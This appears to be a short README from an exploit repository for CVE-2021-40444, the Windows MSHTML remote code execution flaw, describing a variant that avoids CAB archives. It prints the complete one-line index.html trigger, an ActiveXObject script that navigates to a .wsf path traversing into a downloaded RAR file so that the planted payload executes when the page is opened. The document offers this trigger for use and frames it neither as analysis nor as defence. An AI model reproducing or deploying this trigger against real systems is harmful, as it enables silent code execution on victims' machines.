# CVE-2021-40444--CABless version
Modified code so that we donÂ´t need to rely on CAB archives
the file "index.html" that triggers payload execution will contain 1 line of code only, inside 'script' tag:
<script>new ActiveXObject('htmlfile').Script.location='.wsf:../../../Downloads/cabless.rar?.wsf';</script>
